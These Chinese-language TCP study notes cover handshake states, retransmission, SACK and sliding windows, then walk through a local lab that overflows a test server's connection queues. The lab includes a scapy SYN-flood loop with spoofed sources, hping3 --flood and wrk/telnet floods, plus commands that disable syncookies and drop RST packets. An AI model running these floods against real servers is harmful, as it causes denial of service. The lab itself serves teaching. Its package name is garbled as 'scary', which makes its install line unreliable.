#### Introduction
##### TCP传输是无状态的，靠通讯双方维护一个连接状态
![image](https://github.com/yakir3/gitbook/assets/30774576/b6cb0f1e-4474-4931-bbed-180d5e3dfb11)

对于4次挥手：其实你仔细看是2次，因为TCP是全双工的，所以，发送方和接收方都需要Fin和Ack。只不过，有一方是被动的，所以看上去就成了所谓的4次挥手。如果两边同时断连接，那就会就进入到CLOSING状态，然后到达TIME_WAIT状态

TCP建连超时：syn+ack发送后等待最后ack时间，等待默认5次 总时长 63s，才会断开连接<br />SYN Flood攻击：syncookies开启、tcp_max_syn_backlog增大syn队列连接数、tcp_abort_on_overflow处理不过来时直接拒绝连接

ISN初始化：不能hard code，否则断开连接重进会有问题。MSL存活时间小于4.55小时，ISN就不会被重用

MSL和TIME_WAIT：TIME_WAIT转为CLOSED状态时需要等待2MSL时间（MSL为2分钟，linux中为30s）<br />1）TIME_WAIT确保对端收到ACK，如果被动端没有收到ACK则触发重发FIN包，刚好一来一回2MSL时间<br />2）有足够时间让这个连接不会跟后面的连接混用，如果连接被重用，那么延迟收到的包会跟新连接混在一起

TIME_WAIT状态过多问题处理：[https://www.zhihu.com/question/298214130/answer/1090787813](https://www.zhihu.com/question/298214130/answer/1090787813)<br />tcp_max_tw_buckets：TIME_WAIT数量，默认值180000


##### TCP重传机制
注：接收端给发送端的ACK确认只会确认最后一个连续的包
1、超时重传机制 1-5五份数据，第3份数据收不到时
- 仅重传丢失timeout的包，也就是第3份 --节省带宽，慢
- 重传timeout之后所有包，3 4 5三份数据 --好一点，也须等待timeout

2、快速重传机制<br /> Fast Retransmit算法，不以时间驱动，以数据驱动重传。只ack最后可能丢的那个包<br />第一份先到送了，于是就ack回2，结果2因为某些原因没收到，3到达了，于是还是ack回2，后面的4和5都到了，但是还是ack回2，因为2还是没有收到，于是发送端收到了三个ack=2的确认，知道了2还没有到，于是就马上重转2。然后，接收端收到了2，此时因为3，4，5都收到了，于是ack回6
![image](https://github.com/yakir3/gitbook/assets/30774576/99dff7d7-e2c4-4541-ba16-04b4cee163b0)

3、SACK方法：需要在TCP头里加一个SACK的东西，ACK还是Fast Retransmit的ACK，SACK则是汇报收到的数据碎版
![image](https://github.com/yakir3/gitbook/assets/30774576/18e5be64-c958-43f3-b522-377fed681b51)
在发送端就可以根据回传的SACK来知道哪些数据到了，哪些没有到。于是就优化了Fast Retransmit的算法。当然，这个协议需要两边都支持。在 Linux下，可以通过tcp_sack参数打开这个功能

4、Duplicate SACK（D-SACK） -- 重复收到数据的问题：其主要使用了SACK来告诉发送方有哪些数据被重复接收了
- 如果SACK的第一个段的范围被ACK所覆盖，那么就是D-SACK
- 如果SACK的第一个段的范围被SACK的第二个段覆盖，那么就是D-SACK


##### RTT算法：
RTT采样（Round Trip Time） --- 数据包从发送到ACK回来的时间，发送端发包时间是t0，ACK接收到时间是t1 RTT采样=t1-t0<br />RTO（Retransmission TimeOut） --- TCP的TimeOut设置，让重传高效<br />[https://www.imooc.com/article/29368](https://www.imooc.com/article/29368)


##### TCP滑动窗口
TCP头中字段Window：接收端告诉发送端自己还有多少缓冲区可以接收数据
![image](https://github.com/yakir3/gitbook/assets/30774576/7c113f01-8d65-48c1-aa6d-f692f2730dd6)

- 接收端LastByteRead指向了TCP缓冲区中读到的位置，NextByteExpected指向的地方是收到的连续包的最后一个位置，LastByteRcved指向的是收到的包的最后一个位置，我们可以看到中间有些数据还没有到达，所以有数据空白区。
- 发送端的LastByteAcked指向了被接收端Ack过的位置（表示成功发送确认），LastByteSent表示发出去了，但还没有收到成功确认的Ack，LastByteWritten指向的是上层应用正在写的地方

于是：

- 接收端在给发送端回ACK中会汇报自己的AdvertisedWindow = MaxRcvBuffer – LastByteRcvd – 1;
- 而发送方会根据这个窗口来控制发送数据的大小，以保证接收方可以处理

[https://www.imooc.com/article/29368](https://www.imooc.com/article/29368)



#### TCP 全连接与半连接队列
##### 半连接队列溢出 & SYN Flood
测试使用 tcp-server 端
```shell
cat > simple-tcp-server.c << "EOF"
#include <stdio.h>
#include <netinet/in.h>
#include <stdlib.h>
#include <sys/socket.h>
#define PORT 8877
#define SA struct sockaddr

int main()
{
  int sockfd, connfd, len;
  struct sockaddr_in servaddr = {};

  // socket create and verification
  sockfd = socket(AF_INET, SOCK_STREAM, 0);
  if(sockfd == -1) {
    printf("socket creation failed...\n");
    exit(0);
  }

  // assign IP, PORT
  servaddr.sin_family = AF_INET;
  servaddr.sin_addr.s_addr = htonl(INADDR_ANY);
  servaddr.sin_port = htons(PORT);

  // Binding newly created socket to given IP and verification
  if ((bind(sockfd, (SA*)&servaddr, sizeof(servaddr))) != 0) {
    printf("Failed to bind socket\n");
    exit(0);
  }

  // Now server is ready to listen and verification
  // 半连接队列测试：backlog = 8
  // 全连接队列测试：backlog = 1
  if ((listen(sockfd, 8)) != 0) {
    printf("Listen failed\n");
    exit(0);
  }

  printf("Server listening...\n");

  while (1)
  {
      // Don't accept
	  sleep(10);
	  
	  //// Accept the data packet from client and verification
      //connfd = accept(sockfd, (SA *)NULL, NULL);
      //if (connfd == -1)
      //{
      //    printf("Server accept failed...\n");
      //    exit(0);
      //}

      //// Function for receiving data from client and sending it back
      //char buffer[1024];
      //int n = read(connfd, buffer, sizeof(buffer));
      //buffer[n] = '\0';
      //printf("Client message: %s\n", buffer);

      // Close the connection
      close(connfd);
  }

  // Close the socket
  close(sockfd);

  return 0;
}
EOF

# compile and run
gcc -o ststest simple-tcp-server.c
./ststest
```

```shell
# 调整并关闭相关参数
iptables -A OUTPUT -p tcp --tcp-flags RST RST -j DROP
sysctl -w net.ipv4.tcp_syncookies=0
sysctl -w net.core.somaxconn=128
sysctl -w net.ipv4.tcp_max_syn_backlog=256


# attack option1: python scary imitate syn attack
pip intall scary
scary
>>>
from time import sleep
from random import randint
ip = IP(dst="127.0.0.1")
tcp = TCP(dport=8877, flags="S")
conf.L3socket=L3RawSocket
def attack():
  while True:
    ip.src=f"127.0.0.{randint(0, 255)}"
    send(ip/tcp)
    sleep(0.01)
attack()
# attack option2: hping3 imitate syn attack
apt install hping3
hping3 -S -p 8877 --flood 127.0.0.1


# verify
# 查看是否只有 syn 与 syn+ack 包
tcpdump -tn -i lo port 8877
# 查看 SYN-RECV 状态 TCP 连接数量
ss -tna |grep 8877 
LISTEN    0      8                   0.0.0.0:8877                 0.0.0.0:*                                                                                     
SYN-RECV  0      0                 127.0.0.1:8877               127.0.0.1:2022                                                                                  
SYN-RECV  0      0                 127.0.0.1:8877               127.0.0.1:2025                                                                                  
SYN-RECV  0      0                 127.0.0.1:8877               127.0.0.1:2029                                                                                  
SYN-RECV  0      0                 127.0.0.1:8877               127.0.0.1:2026                                                                                  
SYN-RECV  0      0                 127.0.0.1:8877               127.0.0.1:2024                                                                                  
SYN-RECV  0      0                 127.0.0.1:8877               127.0.0.1:2028                                                                                  
SYN-RECV  0      0                 127.0.0.1:8877               127.0.0.1:2027                                                                                  
SYN-RECV  0      0                 127.0.0.1:8877               127.0.0.1:2023                                                                                  
# 查看 TCP 连接因为半连接队列溢出而被丢弃(数据包数量递增)
netstat -s |grep SYNs
87414 SYNs to LISTEN sockets dropped
# 此时已无法建立新的 tcp 连接
telnet 127.0.0.1 8877

```


##### 全连接队列溢出
```shell
# 调整并关闭相关参数
sysctl -w net.ipv4.tcp_syncookies=0
sysctl -w net.ipv4.tcp_abort_on_overflow=0


# nginx
server {
    listen       9999 backlog=10;
...


# attack option1: python scary imitate syn attack
scary
>>>
ip = IP(dst="127.0.0.1")
tcp = TCP(dport=8877, flags="S")
idx = 2
conf.L3socket=L3RawSocket
def connect():
  global idx
  ip.src = f"127.0.0.{ idx }"
  synack = sr1(ip/tcp)
  ack = TCP(sport=synack.dport, dport=synack.sport, flags="A", seq=100, ack=synack.seq + 1)
  send(ip/ack)
  idx += 1
connect()
connect()
...
# attack option2: wrk or telnet
wrk -t 10 -c 30000 -d 30 http://nginx_server:9999 # node1
telnet 172.22.3.29 8877  # node1
telnet 172.22.3.29 8877  # node2
telnet 172.22.3.29 8877  # node3, haven't connect


# verify
# 查看 TCP 已建连数量（内核判断 > min(somaxconn,backlog)）
ss -tna |grep 8877 
LISTEN    2      1                   0.0.0.0:8877                 0.0.0.0:*                                                                                     
ESTAB     0      0                 127.0.0.1:8877               127.0.0.1:20                                                                                    
ESTAB     0      0                 127.0.0.1:8877               127.0.0.2:20                                                                                    
# 查看全连接队列溢出次数
netstat -s |grep overflowed
    5 times the listen queue of a socket overflowed
# 此时再调用 connect 已无法建立新的 tcp 连接
connect()

```




>Reference:
>1. [从一次Connection Reset 说起](https://cjting.me/2019/08/28/tcp-queue/#%E5%8D%8A%E8%BF%9E%E6%8E%A5%E9%98%9F%E5%88%97%E6%BA%A2%E5%87%BA--syn-flood)
>2. [小林Coding：半连接队列与全连接队列](https://www.xiaolincoding.com/network/3_tcp/tcp_queue.html#%E5%AE%9E%E6%88%98-tcp-%E5%8D%8A%E8%BF%9E%E6%8E%A5%E9%98%9F%E5%88%97%E6%BA%A2%E5%87%BA)
>3. 